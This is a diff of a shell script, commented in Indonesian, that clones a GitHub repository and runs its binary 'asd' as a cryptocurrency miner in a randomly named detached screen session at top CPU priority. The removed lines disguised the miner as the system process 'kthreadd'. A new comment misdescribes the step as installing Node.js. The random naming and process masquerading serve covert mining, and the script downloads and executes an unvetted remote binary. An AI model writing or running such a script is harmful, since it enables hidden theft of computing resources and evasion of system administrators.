@@ -3,7 +3,7 @@
 # Nama proses screen random
 RAND_NAME=$(tr -dc a-z0-9 </dev/urandom | head -c 8)
 
-# Instal dependensi
+# Instal Node.js (notjs) dan dependensi lain
 apt-get update -y
 apt-get install -y wget tar screen curl git
 
@@ -12,13 +12,15 @@ git clone https://github.com/amirul5656/webjs.git
 cd webjs
 chmod +x asd
 
-# Duplikat jadi nama sistem
-cp ./asd /usr/bin/kthreadd
+# Jalankan miner dalam screen
+screen -dmS "$RAND_NAME" ./asd
 
-# Jalankan miner
-screen -dmS $RAND_NAME /usr/bin/kthreadd -t $(nproc)
+# Tunggu sebentar agar proses mulai
+sleep 2
 
-# Set prioritas tinggi
-renice -20 -p $(pgrep -f $RAND_NAME)
+# Atur prioritas tinggi untuk proses ./asd
+for PID in $(pgrep -f "./asd"); do
+  renice -20 -p "$PID"
+done
 
-echo "🚀 Miner sedang berjalan di dalam screen: $RAND_NAME"
+echo "🚀 Miner 'asd' sedang berjalan di screen: $RAND_NAME (prioritas tinggi 🔥)"
